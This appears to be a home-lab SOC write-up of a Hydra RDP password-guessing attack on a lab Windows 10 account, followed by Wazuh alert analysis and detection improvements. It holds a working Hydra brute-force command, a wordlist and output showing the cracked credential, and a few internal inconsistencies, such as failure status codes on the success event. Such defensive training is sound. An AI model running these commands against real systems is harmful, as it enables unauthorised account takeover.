# Attack Report: T1110 — Brute Force (RDP)

**Date:** 2026-10-26  
**ATT&CK ID:** T1110.001  
**Technique:** Brute Force — Password Guessing  
**Tactic:** Credential Access  
**Tool:** Hydra (THC Hydra)  
**Attacker:** Kali Linux — 192.168.2.40 (ATTACKNET segment)  
**Target:** Windows 10 Evaluation — 192.168.1.30 (labnet segment)  
**Target account:** labuser (local account, Remote Desktop Users group)  
**Detection result:** FULL — complete attack chain detected  
**Ground truth timestamp:** 2026-10-26T08:30:43Z  

---

## Technique Description

T1110.001 Password Guessing is one of the most common initial access
techniques used against South African organisations. The attacker
systematically tries passwords from a list against a known account until
one succeeds. Unlike T1110.003 (Password Spraying), which tries one
password against many accounts to avoid lockouts, password guessing
targets one account with many passwords.

In the South African context, RDP (Remote Desktop Protocol, port 3389)
is a primary target because thousands of small businesses, government
departments, and healthcare organisations expose RDP directly to the
internet for remote work. A successful RDP brute force gives the attacker
a full graphical desktop session — complete control of the endpoint.

There are four sub-techniques under T1110:

| Sub-technique | Method | Speed | Detection difficulty |
|---|---|---|---|
| T1110.001 Password Guessing | Many passwords, one account | Medium | Easy (volume of 4625 events) |
| T1110.002 Password Cracking | Offline hash cracking | Fast | Hard (no network traffic) |
| T1110.003 Password Spraying | One password, many accounts | Slow | Medium (spread across accounts) |
| T1110.004 Credential Stuffing | Breach database pairs | Fast | Medium (looks like valid logins) |

---

## Windows Event IDs Referenced

These Event IDs are the primary telemetry for authentication-based
detections. A SOC analyst must know these without looking them up.

| Event ID | Description | Relevance to this technique |
|---|---|---|
| 4625 | Failed logon attempt | Primary brute force indicator — one per failed password |
| 4624 | Successful logon | Critical — success after failures means attacker got in |
| 4648 | Logon with explicit credentials | Lateral movement indicator |
| 4740 | Account locked out | Brute force consequence if lockout policy exists |
| 4776 | NTLM credential validation | Appears alongside 4625/4624 for NTLM-based auth |

### Logon Type values (memorise these)

| Logon Type | Name | Meaning |
|---|---|---|
| 2 | Interactive | Physical keyboard login at the console |
| 3 | Network | SMB, net use, NLA pre-authentication |
| 7 | Unlock | Screen unlock after idle |
| 10 | RemoteInteractive | Full RDP desktop session |
| 8 | NetworkCleartext | IIS basic auth, some scripts |

This attack generated Logon Type 3 (Network) rather than Type 10
(RemoteInteractive). This indicates Hydra authenticated at the Network
Level Authentication (NLA) stage of RDP — verifying credentials without
establishing a full desktop session. This is faster, generates less
noise, and leaves a slightly different forensic signature than a full
RDP connection.

---

## Lab Environment Note

This attack crossed the pfSense firewall because Kali is on the ATTACKNET
segment (192.168.2.0/24) and Windows 10 is on the labnet segment
(192.168.1.0/24). The pfSense ATTACKNET firewall rule explicitly permits
Kali (192.168.2.40) to reach Windows 10 (192.168.1.30) on any port.

This means:
- pfSense firewall logs recorded the connection attempts at the network
  layer
- Windows 10 endpoint logs recorded the authentication events
- Wazuh received both sources of evidence simultaneously

This cross-source visibility is what real enterprise SOC environments
provide. The attacker's IP (192.168.2.40) appears in both the network
telemetry and the endpoint telemetry, enabling correlation.

---

## Pre-Attack Setup

### Target account verified

```
net user labuser
User name:              labuser
Account active:         Yes
Password expires:       12/7/2026
Local Group Memberships: Remote Desktop Users, Users
```

### RDP port confirmed open from Kali

```bash
nmap -p 3389 192.168.1.30
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

### Ground truth logged

```bash
gtruth "T1110" "hydra rdp brute force vs 192.168.1.30 account labuser wordlist 10 passwords"
```

Output:
```
[GT LOGGED] 2026-10-26T08:30:43.000Z | T1110 | hydra rdp brute force vs 192.168.1.30 account labuser wordlist 10 passwords
```

---

## Attack Execution

### Password wordlist used

Ten passwords drawn from the rockyou.txt breach dataset — the most
common real-world passwords from actual data breaches:

```
password, 123456, Password1, letmein, welcome,
admin123, qwerty123, Password123, iloveyou, monkey
```

`Password123` is the correct password, placed at position 8 of 10.

### Hydra command

```bash
hydra -l labuser -P /tmp/rdp-passwords.txt rdp://192.168.1.30 -t 4 -V -f
```

**Flag reference:**

| Flag | Meaning |
|---|---|
| `-l labuser` | Single username (lowercase L = literal username) |
| `-P /tmp/rdp-passwords.txt` | Password file (uppercase P = file) |
| `rdp://192.168.1.30` | Protocol and target |
| `-t 4` | 4 parallel tasks |
| `-V` | Verbose — show every attempt |
| `-f` | Stop on first valid credential found |

### Hydra output

```
Hydra starting at 2026-10-26 08:30:43
[DATA] max 4 tasks per server, 10 login tries (l:1/p:10)
[ATTEMPT] labuser:password    — FAIL
[ATTEMPT] labuser:123456      — FAIL
[ATTEMPT] labuser:Password1   — FAIL
[ATTEMPT] labuser:letmein     — FAIL
[ATTEMPT] labuser:welcome     — FAIL
[ATTEMPT] labuser:admin123    — FAIL
[ATTEMPT] labuser:qwerty123   — FAIL
[ATTEMPT] labuser:Password123 — SUCCESS
[3389][rdp] host: 192.168.1.30  login: labuser  password: Password123
1 of 1 target successfully completed, 1 valid credential found
Hydra finished at 2026-10-26 08:30:49
```

**Attack duration: 6 seconds**  
**Password found on attempt: 8 of 10**  
**Authentication method: NTLM, Logon Type 3 (NLA pre-authentication)**

<!-- SCREENSHOT: Insert Hydra terminal output screenshot here -->
<!-- File: screenshots/phase3/2026-10-26_T1110-hydra-output.png -->

---

## SIEM Detection Analysis

### Wazuh alerts generated

<!-- SCREENSHOT: Insert Wazuh Threat Hunting dashboard screenshot showing the alert chain here -->
<!-- File: screenshots/phase3/2026-10-26_T1110-wazuh-alerts.png -->

| Timestamp (UTC) | Rule ID | Description | Level |
|---|---|---|---|
| 08:30:46.219 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:46.249 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:46.250 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:46.265 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:46.302 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:46.305 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:48.557 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:48.574 | 60204 | Multiple Windows Logon Failures | **10** |
| 08:30:48.575 | 60122 | Logon Failure - Unknown user or bad password | 5 |
| 08:30:48.595 | 92657 | Successful Remote Logon — NTLM auth, possible pass-the-hash | **6** |
| 08:30:49.285 | 60602 | Windows application error event | 9 |
| 08:30:50.143 | 60137 | Windows User Logoff | 3 |

### Rule analysis

**Rule 60122 (level 5) — Individual failure events**  
Each failed password attempt generates one 4625 event, which Wazuh maps
to rule 60122. Level 5 is medium — individually not alarming, but the
pattern is significant. A real analyst watching the dashboard would see
these firing in rapid succession and recognise the signature.

**Rule 60204 (level 10) — Brute force threshold**  
This is Wazuh's built-in correlation rule. It fires when multiple 60122
events occur within a short timeframe from the same source. Level 10 is
high severity. In a production SOC this rule would trigger a page to the
on-call analyst. This is the detection that matters most — it says "this
is not a user mistyping their password, this is an automated attack."

**Rule 92657 (level 6) — Successful logon after failures**  
This is the most critical alert. Wazuh detected a successful NTLM
authentication from the same source IP that was just generating failures.
The rule description explicitly flags "possible pass-the-hash attack" and
"Possible RDP connection" — Wazuh is telling the analyst to investigate
whether stolen credentials were used.

### Raw event forensic data (rule 92657)

<!-- SCREENSHOT: Insert Wazuh document details screenshot showing the raw event fields here -->
<!-- File: screenshots/phase3/2026-10-26_T1110-wazuh-document-details.png -->

Key fields from the expanded Wazuh document:

```
agent.name:                              Windows10Desktop
agent.ip:                                192.168.1.30
data.win.eventdata.authenticationPackageName:  NTLM
data.win.eventdata.ipAddress:            192.168.2.40
data.win.eventdata.logonType:            3
data.win.eventdata.logonProcessName:     NtLmSsp
data.win.eventdata.status:               0xc000006d
data.win.eventdata.subStatus:            0xc000006a
```

**Field interpretation:**

`data.win.eventdata.ipAddress: 192.168.2.40` — the attacker's IP is
recorded in the endpoint log. This is Kali's ATTACKNET address, proving
the attack came from outside the corporate LAN segment. This is the
primary hunting field for this technique.

`authenticationPackageName: NTLM` — NTLM authentication on an RDP
connection from an external IP is a red flag. Domain-joined machines
prefer Kerberos. NTLM appearing here means the attacker is authenticating
with a local account, not a domain account.

`logonType: 3` — Network logon, not Type 10 (RemoteInteractive). Hydra
authenticated at the NLA (Network Level Authentication) stage without
completing a full RDP session. This is a faster and quieter technique
than establishing a full desktop.

`status: 0xc000006d` — NTSTATUS code meaning "invalid logon." This
appears on failure events.

`subStatus: 0xc000006a` — "Wrong password." Confirms password guessing
rather than account lockout or other failure mode.

---

## Incident Report Narrative

At 08:30:43 UTC on 2026-10-26, a credential guessing attack was launched
from 192.168.2.40 (Kali Linux, ATTACKNET segment) against Windows 10
host 192.168.1.30 (WINDOWS10DESKTO) via RDP port 3389. The attack used
NTLM Network Level Authentication (Logon Type 3) to test passwords
against the local account labuser.

Seven consecutive authentication failures (Windows Event ID 4625) were
recorded between 08:30:46 and 08:30:48 UTC, triggering Wazuh rule 60204
(Multiple Windows Logon Failures, severity level 10) at 08:30:48 UTC. A
successful NTLM authentication from the same source IP followed
immediately at 08:30:48 UTC, triggering Wazuh rule 92657 (Successful
Remote Logon, severity level 6) with the flag "possible pass-the-hash
attack."

The complete credential guessing cycle from first attempt to successful
authentication lasted 6 seconds. The attacker's IP (192.168.2.40) is
recorded in the Windows event log and visible in Wazuh, confirming the
attack originated from the ATTACKNET segment rather than the corporate
LAN.

---

## Detection Verdict

**FULL** — Wazuh detected the complete attack chain:
- Individual failures via rule 60122
- Brute force threshold via rule 60204 (level 10)
- Successful compromise via rule 92657 (level 6)

No gaps identified for this technique under default Wazuh rules.

---

## Detection Enhancement Opportunities

While default Wazuh rules detected this attack, there are improvements
worth implementing in Phase 4:

**Enhancement 1 — Correlate source IP across failure and success events**  
The current rules fire independently. A custom rule that explicitly links
"multiple failures from IP X followed by a success from the same IP X"
would produce a single high-confidence alert rather than separate events
that an analyst must mentally connect.

**Enhancement 2 — Enrich with pfSense network data**  
The endpoint log shows 192.168.2.40 as the source. pfSense firewall logs
recorded the same connection at the network layer. A Phase 4 custom rule
could correlate both sources and add "attack traffic crossed pfSense
firewall from ATTACKNET segment" context to the alert automatically.

**Enhancement 3 — Threshold tuning for password spraying**  
Rule 60204 fired because of rapid failures from one source. T1110.003
(Password Spraying) specifically avoids this by trying one password
against many accounts slowly. Current rules would not catch a spray
attack at one attempt per minute per account. This is a detection gap to
address in Phase 4.

**Enhancement 4 — Account lockout policy**  
Windows 10 has no account lockout policy configured. A real organisation
would lock the account after 5-10 failures, stopping the attack before
success. Adding a lockout policy via GPO and observing Event ID 4740
(Account Locked Out) is a useful Phase 3 exercise that demonstrates
defence-in-depth.

---

## SA Market Relevance

This technique is directly relevant to the South African financial sector
threat landscape. Digital banking fraud in SA increased 68% in 2024, with
credential theft as a primary vector. Banks including Standard Bank,
Capitec, FNB, and Absa all have SOC teams that monitor for this exact
alert pattern (multiple 4625 events followed by 4624 from the same
source) in their SIEM platforms.

The NTLM authentication flag is particularly relevant. Joint Standard 2
(FSCA/PA, effective June 2025) requires financial institutions to monitor
for authentication anomalies. An NTLM logon from an unexpected source IP
is an explicit anomaly that triggers investigation requirements under this
standard.

---

## Lessons Learned

**Speed of credential guessing:** The attack completed in 6 seconds
against a 10-password wordlist. With rockyou.txt (14 million passwords)
at 4 parallel tasks over a LAN connection, a successful guess on a common
password would occur within minutes. Password complexity requirements and
account lockout policies are the primary technical controls.

**NTLM vs Kerberos as a detection signal:** The appearance of NTLM
authentication on an RDP connection from an external IP is itself a
detection signal, independent of the failure count. In a well-configured
domain environment, most RDP connections from domain users use Kerberos.
NTLM appearing on external connections indicates either a local account
attack or a misconfiguration worth investigating.

**NLA vs full RDP session:** Hydra's RDP module authenticates at the NLA
stage without establishing a full desktop session. This generates Logon
Type 3 rather than Type 10. An analyst who knows only to look for
Type 10 events would miss the NTLM NLA authentication stage entirely.

**Network segmentation as evidence:** The attack crossing pfSense meant
the attacker's IP appeared in both network-layer logs and endpoint logs.
Without segmentation (Kali on the same LAN as targets), the source IP
would still appear in endpoint logs but pfSense would have no record —
reducing the evidence available for investigation.

---

## References

- MITRE ATT&CK T1110: attack.mitre.org/techniques/T1110/
- Windows Event ID 4625: Microsoft Learn — Audit Logon Events
- Windows Event ID 4624: Microsoft Learn — Audit Logon Events
- NTSTATUS codes: docs.microsoft.com/en-us/openspecs/windows_protocols
- Wazuh rule 60204: /var/ossec/ruleset/rules/0580-win-security_rules.xml
- THC Hydra documentation: github.com/vanhauser-thc/thc-hydra
- Joint Standard 2 (FSCA/PA 2024): fsca.co.za